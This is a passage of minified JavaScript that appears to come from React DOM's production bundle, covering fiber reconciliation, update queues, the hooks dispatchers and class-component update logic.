                    e && T && null === Z.alternate && t(f, T), d = l(Z, d, C), null === I ? k = Z : I.sibling = Z, I = Z, T = D
                }
                if (j.done) return n(f, T), H && bt(f, C), k;
                if (null === T) {
                    for (; !j.done; C++, j = h.next()) null !== (j = p(f, j.value, _)) && (d = l(j, d, C), null === I ? k = j : I.sibling = j, I = j);
                    return H && bt(f, C), k
                }
                for (T = r(f, T); !j.done; C++, j = h.next()) null !== (j = g(T, f, C, j.value, _)) && (e && null !== j.alternate && T.delete(null === j.key ? C : j.key), d = l(j, d, C), null === I ? k = j : I.sibling = j, I = j);
                return e && T.forEach((function (A) {
                    return t(f, A)
                })), H && bt(f, C), k
            }(f, d, h, _);
            co(f, h)
        }
        return "string" == typeof h && "" !== h || "number" == typeof h ? (h = "" + h, null !== d && 6 === d.tag ? (n(f, d.sibling), (d = o(d, h)).return = f, f = d) : (n(f, d), (d = wi(h, f.mode, _)).return = f, f = d), i(f)) : n(f, d)
    }
}
var On = Ed(!0),
    kd = Ed(!1),
    qo = $t(null),
    el = null,
    xn = null,
    ru = null;

function ou() {
    ru = xn = el = null
}

function lu(e) {
    var t = qo.current;
    W(qo), e._currentValue = t
}

function rs(e, t, n) {
    for (; null !== e;) {
        var r = e.alternate;
        if ((e.childLanes & t) !== t ? (e.childLanes |= t, null !== r && (r.childLanes |= t)) : null !== r && (r.childLanes & t) !== t && (r.childLanes |= t), e === n) break;
        e = e.return
    }
}

function Pn(e, t) {
    el = e, ru = xn = null, null !== (e = e.dependencies) && null !== e.firstContext && (e.lanes & t && (ge = !0), e.firstContext = null)
}

function Me(e) {
    var t = e._currentValue;
    if (ru !== e)
        if (e = {
            context: e,
            memoizedValue: t,
            next: null
        }, null === xn) {
            if (null === el) throw Error(E(308));
            xn = e, el.dependencies = {
                lanes: 0,
                firstContext: e
            }
        } else xn = xn.next = e;
    return t
}
var Gt = null;

function iu(e) {
    null === Gt ? Gt = [e] : Gt.push(e)
}

function Cd(e, t, n, r) {
    var o = t.interleaved;
    return null === o ? (n.next = n, iu(t)) : (n.next = o.next, o.next = n), t.interleaved = n, at(e, r)
}

function at(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (null !== n && (n.lanes |= t), n = e, e = e.return; null !== e;) e.childLanes |= t, null !== (n = e.alternate) && (n.childLanes |= t), n = e, e = e.return;
    return 3 === n.tag ? n.stateNode : null
}
var wt = !1;

function su(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: {
            pending: null,
            interleaved: null,
            lanes: 0
        },
        effects: null
    }
}

function Nd(e, t) {
    e = e.updateQueue, t.updateQueue === e && (t.updateQueue = {
        baseState: e.baseState,
        firstBaseUpdate: e.firstBaseUpdate,
        lastBaseUpdate: e.lastBaseUpdate,
        shared: e.shared,
        effects: e.effects
    })
}

function lt(e, t) {
    return {
        eventTime: e,
        lane: t,
        tag: 0,
        payload: null,
        callback: null,
        next: null
    }
}

function It(e, t, n) {
    var r = e.updateQueue;
    if (null === r) return null;
    if (r = r.shared, 2 & M) {
        var o = r.pending;
        return null === o ? t.next = t : (t.next = o.next, o.next = t), r.pending = t, at(e, n)
    }
    return null === (o = r.interleaved) ? (t.next = t, iu(r)) : (t.next = o.next, o.next = t), r.interleaved = t, at(e, n)
}

function Io(e, t, n) {
    if (null !== (t = t.updateQueue) && (t = t.shared, 4194240 & n)) {
        var r = t.lanes;
        n |= r &= e.pendingLanes, t.lanes = n, Gs(e, n)
    }
}

function Sa(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (null !== r && n === (r = r.updateQueue)) {
        var o = null,
            l = null;
        if (null !== (n = n.firstBaseUpdate)) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null
                };
                null === l ? o = l = i : l = l.next = i, n = n.next
            } while (null !== n);
            null === l ? o = l = t : l = l.next = t
        } else o = l = t;
        return n = {
            baseState: r.baseState,
            firstBaseUpdate: o,
            lastBaseUpdate: l,
            shared: r.shared,
            effects: r.effects
        }, void (e.updateQueue = n)
    }
    null === (e = n.lastBaseUpdate) ? n.firstBaseUpdate = t : e.next = t, n.lastBaseUpdate = t
}

function tl(e, t, n, r) {
    var o = e.updateQueue;
    wt = !1;
    var l = o.firstBaseUpdate,
        i = o.lastBaseUpdate,
        s = o.shared.pending;
    if (null !== s) {
        o.shared.pending = null;
        var u = s,
            a = u.next;
        u.next = null, null === i ? l = a : i.next = a, i = u;
        var c = e.alternate;
        null !== c && ((s = (c = c.updateQueue).lastBaseUpdate) !== i && (null === s ? c.firstBaseUpdate = a : s.next = a, c.lastBaseUpdate = u))
    }
    if (null !== l) {
        var p = o.baseState;
        for (i = 0, c = a = u = null, s = l; ;) {
            var m = s.lane,
                g = s.eventTime;
            if ((r & m) === m) {
                null !== c && (c = c.next = {
                    eventTime: g,
                    lane: 0,
                    tag: s.tag,
                    payload: s.payload,
                    callback: s.callback,
                    next: null
                });
                e: {
                    var w = e,
                        y = s;
                    switch (m = t, g = n, y.tag) {
                        case 1:
                            if ("function" == typeof (w = y.payload)) {
                                p = w.call(g, p, m);
                                break e
                            }
                            p = w;
                            break e;
                        case 3:
                            w.flags = -65537 & w.flags | 128;
                        case 0:
                            if (null == (m = "function" == typeof (w = y.payload) ? w.call(g, p, m) : w)) break e;
                            p = Q({}, p, m);
                            break e;
                        case 2:
                            wt = !0
                    }
                }
                null !== s.callback && 0 !== s.lane && (e.flags |= 64, null === (m = o.effects) ? o.effects = [s] : m.push(s))
            } else g = {
                eventTime: g,
                lane: m,
                tag: s.tag,
                payload: s.payload,
                callback: s.callback,
                next: null
            }, null === c ? (a = c = g, u = p) : c = c.next = g, i |= m;
            if (null === (s = s.next)) {
                if (null === (s = o.shared.pending)) break;
                s = (m = s).next, m.next = null, o.lastBaseUpdate = m, o.shared.pending = null
            }
        }
        if (null === c && (u = p), o.baseState = u, o.firstBaseUpdate = a, o.lastBaseUpdate = c, null !== (t = o.shared.interleaved)) {
            o = t;
            do {
                i |= o.lane, o = o.next
            } while (o !== t)
        } else null === l && (o.shared.lanes = 0);
        en |= i, e.lanes = i, e.memoizedState = p
    }
}

function _a(e, t, n) {
    if (e = t.effects, t.effects = null, null !== e)
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                o = r.callback;
            if (null !== o) {
                if (r.callback = null, r = n, "function" != typeof o) throw Error(E(191, o));
                o.call(r)
            }
        }
}
var Vr = {},
    Ze = $t(Vr),
    Cr = $t(Vr),
    Nr = $t(Vr);

function Kt(e) {
    if (e === Vr) throw Error(E(174));
    return e
}

function uu(e, t) {
    switch (V(Nr, t), V(Cr, e), V(Ze, Vr), e = t.nodeType) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : $i(null, "");
            break;
        default:
            t = $i(t = (e = 8 === e ? t.parentNode : t).namespaceURI || null, e = e.tagName)
    }
    W(Ze), V(Ze, t)
}

function zn() {
    W(Ze), W(Cr), W(Nr)
}

function Pd(e) {
    Kt(Nr.current);
    var t = Kt(Ze.current),
        n = $i(t, e.type);
    t !== n && (V(Cr, e), V(Ze, n))
}

function au(e) {
    Cr.current === e && (W(Ze), W(Cr))
}
var G = $t(0);

function nl(e) {
    for (var t = e; null !== t;) {
        if (13 === t.tag) {
            var n = t.memoizedState;
            if (null !== n && (null === (n = n.dehydrated) || "$?" === n.data || "$!" === n.data)) return t
        } else if (19 === t.tag && void 0 !== t.memoizedProps.revealOrder) {
            if (128 & t.flags) return t
        } else if (null !== t.child) {
            t.child.return = t, t = t.child;
            continue
        }
        if (t === e) break;
        for (; null === t.sibling;) {
            if (null === t.return || t.return === e) return null;
            t = t.return
        }
        t.sibling.return = t.return, t = t.sibling
    }
    return null
}
var pi = [];

function cu() {
    for (var e = 0; e < pi.length; e++) pi[e]._workInProgressVersionPrimary = null;
    pi.length = 0
}
var Ro = pt.ReactCurrentDispatcher,
    mi = pt.ReactCurrentBatchConfig,
    qt = 0,
    K = null,
    q = null,
    te = null,
    rl = !1,
    cr = !1,
    Pr = 0,
    Rh = 0;

function se() {
    throw Error(E(321))
}

function du(e, t) {
    if (null === t) return !1;
    for (var n = 0; n < t.length && n < e.length; n++)
        if (!He(e[n], t[n])) return !1;
    return !0
}

function fu(e, t, n, r, o, l) {
    if (qt = l, K = t, t.memoizedState = null, t.updateQueue = null, t.lanes = 0, Ro.current = null === e || null === e.memoizedState ? Lh : Mh, e = n(r, o), cr) {
        l = 0;
        do {
            if (cr = !1, Pr = 0, 25 <= l) throw Error(E(301));
            l += 1, te = q = null, t.updateQueue = null, Ro.current = Ah, e = n(r, o)
        } while (cr)
    }
    if (Ro.current = ol, t = null !== q && null !== q.next, qt = 0, te = q = K = null, rl = !1, t) throw Error(E(300));
    return e
}

function pu() {
    var e = 0 !== Pr;
    return Pr = 0, e
}

function Qe() {
    var e = {
        memoizedState: null,
        baseState: null,
        baseQueue: null,
        queue: null,
        next: null
    };
    return null === te ? K.memoizedState = te = e : te = te.next = e, te
}

function Ae() {
    if (null === q) {
        var e = K.alternate;
        e = null !== e ? e.memoizedState : null
    } else e = q.next;
    var t = null === te ? K.memoizedState : te.next;
    if (null !== t) te = t, q = e;
    else {
        if (null === e) throw Error(E(310));
        e = {
            memoizedState: (q = e).memoizedState,
            baseState: q.baseState,
            baseQueue: q.baseQueue,
            queue: q.queue,
            next: null
        }, null === te ? K.memoizedState = te = e : te = te.next = e
    }
    return te
}

function Tr(e, t) {
    return "function" == typeof t ? t(e) : t
}

function hi(e) {
    var t = Ae(),
        n = t.queue;
    if (null === n) throw Error(E(311));
    n.lastRenderedReducer = e;
    var r = q,
        o = r.baseQueue,
        l = n.pending;
    if (null !== l) {
        if (null !== o) {
            var i = o.next;
            o.next = l.next, l.next = i
        }
        r.baseQueue = o = l, n.pending = null
    }
    if (null !== o) {
        l = o.next, r = r.baseState;
        var s = i = null,
            u = null,
            a = l;
        do {
            var c = a.lane;
            if ((qt & c) === c) null !== u && (u = u.next = {
                lane: 0,
                action: a.action,
                hasEagerState: a.hasEagerState,
                eagerState: a.eagerState,
                next: null
            }), r = a.hasEagerState ? a.eagerState : e(r, a.action);
            else {
                var p = {
                    lane: c,
                    action: a.action,
                    hasEagerState: a.hasEagerState,
                    eagerState: a.eagerState,
                    next: null
                };
                null === u ? (s = u = p, i = r) : u = u.next = p, K.lanes |= c, en |= c
            }
            a = a.next
        } while (null !== a && a !== l);
        null === u ? i = r : u.next = s, He(r, t.memoizedState) || (ge = !0), t.memoizedState = r, t.baseState = i, t.baseQueue = u, n.lastRenderedState = r
    }
    if (null !== (e = n.interleaved)) {
        o = e;
        do {
            l = o.lane, K.lanes |= l, en |= l, o = o.next
        } while (o !== e)
    } else null === o && (n.lanes = 0);
    return [t.memoizedState, n.dispatch]
}

function vi(e) {
    var t = Ae(),
        n = t.queue;
    if (null === n) throw Error(E(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        o = n.pending,
        l = t.memoizedState;
    if (null !== o) {
        n.pending = null;
        var i = o = o.next;
        do {
            l = e(l, i.action), i = i.next
        } while (i !== o);
        He(l, t.memoizedState) || (ge = !0), t.memoizedState = l, null === t.baseQueue && (t.baseState = l), n.lastRenderedState = l
    }
    return [l, r]
}

function Td() { }

function Id(e, t) {
    var n = K,
        r = Ae(),
        o = t(),
        l = !He(r.memoizedState, o);
    if (l && (r.memoizedState = o, ge = !0), r = r.queue, mu(Od.bind(null, n, r, e), [e]), r.getSnapshot !== t || l || null !== te && 1 & te.memoizedState.tag) {
        if (n.flags |= 2048, Ir(9, jd.bind(null, n, r, o, t), void 0, null), null === ne) throw Error(E(349));
        30 & qt || Rd(n, t, o)
    }
    return o
}

function Rd(e, t, n) {
    e.flags |= 16384, e = {
        getSnapshot: t,
        value: n
    }, null === (t = K.updateQueue) ? (t = {
        lastEffect: null,
        stores: null
    }, K.updateQueue = t, t.stores = [e]) : null === (n = t.stores) ? t.stores = [e] : n.push(e)
}

function jd(e, t, n, r) {
    t.value = n, t.getSnapshot = r, zd(t) && Ld(e)
}

function Od(e, t, n) {
    return n((function () {
        zd(t) && Ld(e)
    }))
}

function zd(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !He(e, n)
    } catch {
        return !0
    }
}

function Ld(e) {
    var t = at(e, 1);
    null !== t && We(t, e, 1, -1)
}

function Ea(e) {
    var t = Qe();
    return "function" == typeof e && (e = e()), t.memoizedState = t.baseState = e, e = {
        pending: null,
        interleaved: null,
        lanes: 0,
        dispatch: null,
        lastRenderedReducer: Tr,
        lastRenderedState: e
    }, t.queue = e, e = e.dispatch = zh.bind(null, K, e), [t.memoizedState, e]
}

function Ir(e, t, n, r) {
    return e = {
        tag: e,
        create: t,
        destroy: n,
        deps: r,
        next: null
    }, null === (t = K.updateQueue) ? (t = {
        lastEffect: null,
        stores: null
    }, K.updateQueue = t, t.lastEffect = e.next = e) : null === (n = t.lastEffect) ? t.lastEffect = e.next = e : (r = n.next, n.next = e, e.next = r, t.lastEffect = e), e
}

function Md() {
    return Ae().memoizedState
}

function jo(e, t, n, r) {
    var o = Qe();
    K.flags |= e, o.memoizedState = Ir(1 | t, n, void 0, void 0 === r ? null : r)
}

function El(e, t, n, r) {
    var o = Ae();
    r = void 0 === r ? null : r;
    var l = void 0;
    if (null !== q) {
        var i = q.memoizedState;
        if (l = i.destroy, null !== r && du(r, i.deps)) return void (o.memoizedState = Ir(t, n, l, r))
    }
    K.flags |= e, o.memoizedState = Ir(1 | t, n, l, r)
}

function ka(e, t) {
    return jo(8390656, 8, e, t)
}

function mu(e, t) {
    return El(2048, 8, e, t)
}

function Ad(e, t) {
    return El(4, 2, e, t)
}

function $d(e, t) {
    return El(4, 4, e, t)
}

function Dd(e, t) {
    return "function" == typeof t ? (e = e(), t(e), function () {
        t(null)
    }) : null != t ? (e = e(), t.current = e, function () {
        t.current = null
    }) : void 0
}

function Fd(e, t, n) {
    return n = null != n ? n.concat([e]) : null, El(4, 4, Dd.bind(null, t, e), n)
}

function hu() { }

function Vd(e, t) {
    var n = Ae();
    t = void 0 === t ? null : t;
    var r = n.memoizedState;
    return null !== r && null !== t && du(t, r[1]) ? r[0] : (n.memoizedState = [e, t], e)
}

function Ud(e, t) {
    var n = Ae();
    t = void 0 === t ? null : t;
    var r = n.memoizedState;
    return null !== r && null !== t && du(t, r[1]) ? r[0] : (e = e(), n.memoizedState = [e, t], e)
}

function bd(e, t, n) {
    return 21 & qt ? (He(n, t) || (n = Kc(), K.lanes |= n, en |= n, e.baseState = !0), t) : (e.baseState && (e.baseState = !1, ge = !0), e.memoizedState = n)
}

function jh(e, t) {
    var n = $;
    $ = 0 !== n && 4 > n ? n : 4, e(!0);
    var r = mi.transition;
    mi.transition = {};
    try {
        e(!1), t()
    } finally {
        $ = n, mi.transition = r
    }
}

function Wd() {
    return Ae().memoizedState
}

function Oh(e, t, n) {
    var r = jt(e);
    if (n = {
        lane: r,
        action: n,
        hasEagerState: !1,
        eagerState: null,
        next: null
    }, Hd(e)) Bd(t, n);
    else if (null !== (n = Cd(e, t, n, r))) {
        We(n, e, r, pe()), Gd(n, t, r)
    }
}

function zh(e, t, n) {
    var r = jt(e),
        o = {
            lane: r,
            action: n,
            hasEagerState: !1,
            eagerState: null,
            next: null
        };
    if (Hd(e)) Bd(t, o);
    else {
        var l = e.alternate;
        if (0 === e.lanes && (null === l || 0 === l.lanes) && null !== (l = t.lastRenderedReducer)) try {
            var i = t.lastRenderedState,
                s = l(i, n);
            if (o.hasEagerState = !0, o.eagerState = s, He(s, i)) {
                var u = t.interleaved;
                return null === u ? (o.next = o, iu(t)) : (o.next = u.next, u.next = o), void (t.interleaved = o)
            }
        } catch { }
        null !== (n = Cd(e, t, o, r)) && (We(n, e, r, o = pe()), Gd(n, t, r))
    }
}

function Hd(e) {
    var t = e.alternate;
    return e === K || null !== t && t === K
}

function Bd(e, t) {
    cr = rl = !0;
    var n = e.pending;
    null === n ? t.next = t : (t.next = n.next, n.next = t), e.pending = t
}

function Gd(e, t, n) {
    if (4194240 & n) {
        var r = t.lanes;
        n |= r &= e.pendingLanes, t.lanes = n, Gs(e, n)
    }
}
var ol = {
    readContext: Me,
    useCallback: se,
    useContext: se,
    useEffect: se,
    useImperativeHandle: se,
    useInsertionEffect: se,
    useLayoutEffect: se,
    useMemo: se,
    useReducer: se,
    useRef: se,
    useState: se,
    useDebugValue: se,
    useDeferredValue: se,
    useTransition: se,
    useMutableSource: se,
    useSyncExternalStore: se,
    useId: se,
    unstable_isNewReconciler: !1
},
    Lh = {
        readContext: Me,
        useCallback: function (e, t) {
            return Qe().memoizedState = [e, void 0 === t ? null : t], e
        },
        useContext: Me,
        useEffect: ka,
        useImperativeHandle: function (e, t, n) {
            return n = null != n ? n.concat([e]) : null, jo(4194308, 4, Dd.bind(null, t, e), n)
        },
        useLayoutEffect: function (e, t) {
            return jo(4194308, 4, e, t)
        },
        useInsertionEffect: function (e, t) {
            return jo(4, 2, e, t)
        },
        useMemo: function (e, t) {
            var n = Qe();
            return t = void 0 === t ? null : t, e = e(), n.memoizedState = [e, t], e
        },
        useReducer: function (e, t, n) {
            var r = Qe();
            return t = void 0 !== n ? n(t) : t, r.memoizedState = r.baseState = t, e = {
                pending: null,
                interleaved: null,
                lanes: 0,
                dispatch: null,
                lastRenderedReducer: e,
                lastRenderedState: t
            }, r.queue = e, e = e.dispatch = Oh.bind(null, K, e), [r.memoizedState, e]
        },
        useRef: function (e) {
            return e = {
                current: e
            }, Qe().memoizedState = e
        },
        useState: Ea,
        useDebugValue: hu,
        useDeferredValue: function (e) {
            return Qe().memoizedState = e
        },
        useTransition: function () {
            var e = Ea(!1),
                t = e[0];
            return e = jh.bind(null, e[1]), Qe().memoizedState = e, [t, e]
        },
        useMutableSource: function () { },
        useSyncExternalStore: function (e, t, n) {
            var r = K,
                o = Qe();
            if (H) {
                if (void 0 === n) throw Error(E(407));
                n = n()
            } else {
                if (n = t(), null === ne) throw Error(E(349));
                30 & qt || Rd(r, t, n)
            }
            o.memoizedState = n;
            var l = {
                value: n,
                getSnapshot: t
            };
            return o.queue = l, ka(Od.bind(null, r, l, e), [e]), r.flags |= 2048, Ir(9, jd.bind(null, r, l, n, t), void 0, null), n
        },
        useId: function () {
            var e = Qe(),
                t = ne.identifierPrefix;
            if (H) {
                var n = ot;
                t = ":" + t + "R" + (n = (rt & ~(1 << 32 - be(rt) - 1)).toString(32) + n), 0 < (n = Pr++) && (t += "H" + n.toString(32)), t += ":"
            } else t = ":" + t + "r" + (n = Rh++).toString(32) + ":";
            return e.memoizedState = t
        },
        unstable_isNewReconciler: !1
    },
    Mh = {
        readContext: Me,
        useCallback: Vd,
        useContext: Me,
        useEffect: mu,
        useImperativeHandle: Fd,
        useInsertionEffect: Ad,
        useLayoutEffect: $d,
        useMemo: Ud,
        useReducer: hi,
        useRef: Md,
        useState: function () {
            return hi(Tr)
        },
        useDebugValue: hu,
        useDeferredValue: function (e) {
            return bd(Ae(), q.memoizedState, e)
        },
        useTransition: function () {
            return [hi(Tr)[0], Ae().memoizedState]
        },
        useMutableSource: Td,
        useSyncExternalStore: Id,
        useId: Wd,
        unstable_isNewReconciler: !1
    },
    Ah = {
        readContext: Me,
        useCallback: Vd,
        useContext: Me,
        useEffect: mu,
        useImperativeHandle: Fd,
        useInsertionEffect: Ad,
        useLayoutEffect: $d,
        useMemo: Ud,
        useReducer: vi,
        useRef: Md,
        useState: function () {
            return vi(Tr)
        },
        useDebugValue: hu,
        useDeferredValue: function (e) {
            var t = Ae();
            return null === q ? t.memoizedState = e : bd(t, q.memoizedState, e)
        },
        useTransition: function () {
            return [vi(Tr)[0], Ae().memoizedState]
        },
        useMutableSource: Td,
        useSyncExternalStore: Id,
        useId: Wd,
        unstable_isNewReconciler: !1
    };

function De(e, t) {
    if (e && e.defaultProps) {
        for (var n in t = Q({}, t), e = e.defaultProps) void 0 === t[n] && (t[n] = e[n]);
        return t
    }
    return t
}

function os(e, t, n, r) {
    n = null == (n = n(r, t = e.memoizedState)) ? t : Q({}, t, n), e.memoizedState = n, 0 === e.lanes && (e.updateQueue.baseState = n)
}
var kl = {
    isMounted: function (e) {
        return !!(e = e._reactInternals) && ln(e) === e
    },
    enqueueSetState: function (e, t, n) {
        e = e._reactInternals;
        var r = pe(),
            o = jt(e),
            l = lt(r, o);
        l.payload = t, null != n && (l.callback = n), null !== (t = It(e, l, o)) && (We(t, e, o, r), Io(t, e, o))
    },
    enqueueReplaceState: function (e, t, n) {
        e = e._reactInternals;
        var r = pe(),
            o = jt(e),
            l = lt(r, o);
        l.tag = 1, l.payload = t, null != n && (l.callback = n), null !== (t = It(e, l, o)) && (We(t, e, o, r), Io(t, e, o))
    },
    enqueueForceUpdate: function (e, t) {
        e = e._reactInternals;
        var n = pe(),
            r = jt(e),
            o = lt(n, r);
        o.tag = 2, null != t && (o.callback = t), null !== (t = It(e, o, r)) && (We(t, e, r, n), Io(t, e, r))
    }
};

function Ca(e, t, n, r, o, l, i) {
    return "function" == typeof (e = e.stateNode).shouldComponentUpdate ? e.shouldComponentUpdate(r, l, i) : !t.prototype || !t.prototype.isPureReactComponent || (!Sr(n, r) || !Sr(o, l))
}

function Kd(e, t, n) {
    var r = !1,
        o = Lt,
        l = t.contextType;
    return "object" == typeof l && null !== l ? l = Me(l) : (o = we(t) ? Jt : ce.current, l = (r = null != (r = t.contextTypes)) ? Rn(e, o) : Lt), t = new t(n, l), e.memoizedState = null !== t.state && void 0 !== t.state ? t.state : null, t.updater = kl, e.stateNode = t, t._reactInternals = e, r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = o, e.__reactInternalMemoizedMaskedChildContext = l), t
}

function Na(e, t, n, r) {
    e = t.state, "function" == typeof t.componentWillReceiveProps && t.componentWillReceiveProps(n, r), "function" == typeof t.UNSAFE_componentWillReceiveProps && t.UNSAFE_componentWillReceiveProps(n, r), t.state !== e && kl.enqueueReplaceState(t, t.state, null)
}

function ls(e, t, n, r) {
    var o = e.stateNode;
    o.props = n, o.state = e.memoizedState, o.refs = {}, su(e);
    var l = t.contextType;
    "object" == typeof l && null !== l ? o.context = Me(l) : (l = we(t) ? Jt : ce.current, o.context = Rn(e, l)), o.state = e.memoizedState, "function" == typeof (l = t.getDerivedStateFromProps) && (os(e, t, l, n), o.state = e.memoizedState), "function" == typeof t.getDerivedStateFromProps || "function" == typeof o.getSnapshotBeforeUpdate || "function" != typeof o.UNSAFE_componentWillMount && "function" != typeof o.componentWillMount || (t = o.state, "function" == typeof o.componentWillMount && o.componentWillMount(), "function" == typeof o.UNSAFE_componentWillMount && o.UNSAFE_componentWillMount(), t !== o.state && kl.enqueueReplaceState(o, o.state, null), tl(e, n, o, r), o.state = e.memoizedState), "function" == typeof o.componentDidMount && (e.flags |= 4194308)
}

function Ln(e, t) {
    try {
        var n = "",
            r = t;
        do {
            n += cm(r), r = r.return
        } while (r);
        var o = n
    } catch (l) {
        o = "\nError generating stack: " + l.message + "\n" + l.stack
    }
    return {
        value: e,
        source: t,
        stack: o,
        digest: null
    }
}

function gi(e, t, n) {
    return {
        value: e,
        source: null,
        stack: n ?? null,
        digest: t ?? null
    }
}

function is(e, t) {
    try {
        console.error(t.value)
    } catch (n) {
        setTimeout((function () {
            throw n
        }))
    }
}
var $h = "function" == typeof WeakMap ? WeakMap : Map;

function Qd(e, t, n) {
    (n = lt(-1, n)).tag = 3, n.payload = {
        element: null
    };
    var r = t.value;
    return n.callback = function () {
        il || (il = !0, vs = r), is(e, t)
    }, n
}

function Yd(e, t, n) {
    (n = lt(-1, n)).tag = 3;
    var r = e.type.getDerivedStateFromError;
    if ("function" == typeof r) {
        var o = t.value;
        n.payload = function () {
            return r(o)
        }, n.callback = function () {
            is(e, t)
        }
    }
    var l = e.stateNode;
    return null !== l && "function" == typeof l.componentDidCatch && (n.callback = function () {
        is(e, t), "function" != typeof r && (null === Rt ? Rt = new Set([this]) : Rt.add(this));
        var i = t.stack;
        this.componentDidCatch(t.value, {
            componentStack: null !== i ? i : ""
        })
    }), n
}

function Pa(e, t, n) {
    var r = e.pingCache;
    if (null === r) {
        r = e.pingCache = new $h;
        var o = new Set;
        r.set(t, o)
    } else void 0 === (o = r.get(t)) && (o = new Set, r.set(t, o));
    o.has(n) || (o.add(n), e = Jh.bind(null, e, t, n), t.then(e, e))
}

function Ta(e) {
    do {
        var t;
        if ((t = 13 === e.tag) && (t = null === (t = e.memoizedState) || null !== t.dehydrated), t) return e;
        e = e.return
    } while (null !== e);
    return null
}

function Ia(e, t, n, r, o) {
    return 1 & e.mode ? (e.flags |= 65536, e.lanes = o, e) : (e === t ? e.flags |= 65536 : (e.flags |= 128, n.flags |= 131072, n.flags &= -52805, 1 === n.tag && (null === n.alternate ? n.tag = 17 : ((t = lt(-1, 1)).tag = 2, It(n, t, 1))), n.lanes |= 1), e)
}
var Dh = pt.ReactCurrentOwner,
    ge = !1;

function fe(e, t, n, r) {
    t.child = null === e ? kd(t, null, n, r) : On(t, e.child, n, r)
}

function Ra(e, t, n, r, o) {
    n = n.render;
    var l = t.ref;
    return Pn(t, o), r = fu(e, t, n, r, l, o), n = pu(), null === e || ge ? (H && n && eu(t), t.flags |= 1, fe(e, t, r, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, ct(e, t, o))
}

function ja(e, t, n, r, o) {
    if (null === e) {
        var l = n.type;
        return "function" != typeof l || Eu(l) || void 0 !== l.defaultProps || null !== n.compare || void 0 !== n.defaultProps ? ((e = Mo(n.type, null, r, t, t.mode, o)).ref = t.ref, e.return = t, t.child = e) : (t.tag = 15, t.type = l, Xd(e, t, l, r, o))
    }
    if (l = e.child, !(e.lanes & o)) {
        var i = l.memoizedProps;
        if ((n = null !== (n = n.compare) ? n : Sr)(i, r) && e.ref === t.ref) return ct(e, t, o)
    }
    return t.flags |= 1, (e = Ot(l, r)).ref = t.ref, e.return = t, t.child = e
}

function Xd(e, t, n, r, o) {
    if (null !== e) {
        var l = e.memoizedProps;
        if (Sr(l, r) && e.ref === t.ref) {
            if (ge = !1, t.pendingProps = r = l, !(e.lanes & o)) return t.lanes = e.lanes, ct(e, t, o);
            131072 & e.flags && (ge = !0)
        }
    }
    return ss(e, t, n, r, o)
}

function Jd(e, t, n) {
    var r = t.pendingProps,
        o = r.children,
        l = null !== e ? e.memoizedState : null;
    if ("hidden" === r.mode)
        if (1 & t.mode) {
            if (!(1073741824 & n)) return e = null !== l ? l.baseLanes | n : n, t.lanes = t.childLanes = 1073741824, t.memoizedState = {
                baseLanes: e,
                cachePool: null,
                transitions: null
            }, t.updateQueue = null, V(_n, _e), _e |= e, null;
            t.memoizedState = {
                baseLanes: 0,
                cachePool: null,
                transitions: null
            }, r = null !== l ? l.baseLanes : n, V(_n, _e), _e |= r
        } else t.memoizedState = {
            baseLanes: 0,
            cachePool: null,
            transitions: null
        }, V(_n, _e), _e |= n;
    else null !== l ? (r = l.baseLanes | n, t.memoizedState = null) : r = n, V(_n, _e), _e |= r;
    return fe(e, t, o, n), t.child
}

function Zd(e, t) {
    var n = t.ref;
    (null === e && null !== n || null !== e && e.ref !== n) && (t.flags |= 512, t.flags |= 2097152)
}

function ss(e, t, n, r, o) {
    var l = we(n) ? Jt : ce.current;
    return l = Rn(t, l), Pn(t, o), n = fu(e, t, n, r, l, o), r = pu(), null === e || ge ? (H && r && eu(t), t.flags |= 1, fe(e, t, n, o), t.child) : (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, ct(e, t, o))
}

function Oa(e, t, n, r, o) {
    if (we(n)) {
        var l = !0;
        Xo(t)
    } else l = !1;
    if (Pn(t, o), null === t.stateNode) Oo(e, t), Kd(t, n, r), ls(t, n, r, o), r = !0;
    else if (null === e) {
        var i = t.stateNode,
            s = t.memoizedProps;
        i.props = s;
        var u = i.context,
            a = n.contextType;
        "object" == typeof a && null !== a ? a = Me(a) : a = Rn(t, a = we(n) ? Jt : ce.current);
        var c = n.getDerivedStateFromProps,
            p = "function" == typeof c || "function" == typeof i.getSnapshotBeforeUpdate;
        p || "function" != typeof i.UNSAFE_componentWillReceiveProps && "function" != typeof i.componentWillReceiveProps || (s !== r || u !== a) && Na(t, i, r, a), wt = !1;
        var m = t.memoizedState;
        i.state = m, tl(t, r, i, o), u = t.memoizedState, s !== r || m !== u || ye.current || wt ? ("function" == typeof c && (os(t, n, c, r), u = t.memoizedState), (s = wt || Ca(t, n, s, r, m, u, a)) ? (p || "function" != typeof i.UNSAFE_componentWillMount && "function" != typeof i.componentWillMount || ("function" == typeof i.componentWillMount && i.componentWillMount(), "function" == typeof i.UNSAFE_componentWillMount && i.UNSAFE_componentWillMount()), "function" == typeof i.componentDidMount && (t.flags |= 4194308)) : ("function" == typeof i.componentDidMount && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = u), i.props = r, i.state = u, i.context = a, r = s) : ("function" == typeof i.componentDidMount && (t.flags |= 4194308), r = !1)
    } else {
        i = t.stateNode, Nd(e, t), s = t.memoizedProps, a = t.type === t.elementType ? s : De(t.type, s), i.props = a, p = t.pendingProps, m = i.context, "object" == typeof (u = n.contextType) && null !== u ? u = Me(u) : u = Rn(t, u = we(n) ? Jt : ce.current);
        var g = n.getDerivedStateFromProps;
        (c = "function" == typeof g || "function" == typeof i.getSnapshotBeforeUpdate) || "function" != typeof i.UNSAFE_componentWillReceiveProps && "function" != typeof i.componentWillReceiveProps || (s !== p || m !== u) && Na(t, i, r, u), wt = !1, m = t.memoizedState, i.state = m, tl(t, r, i, o);
        var w = t.memoizedState;
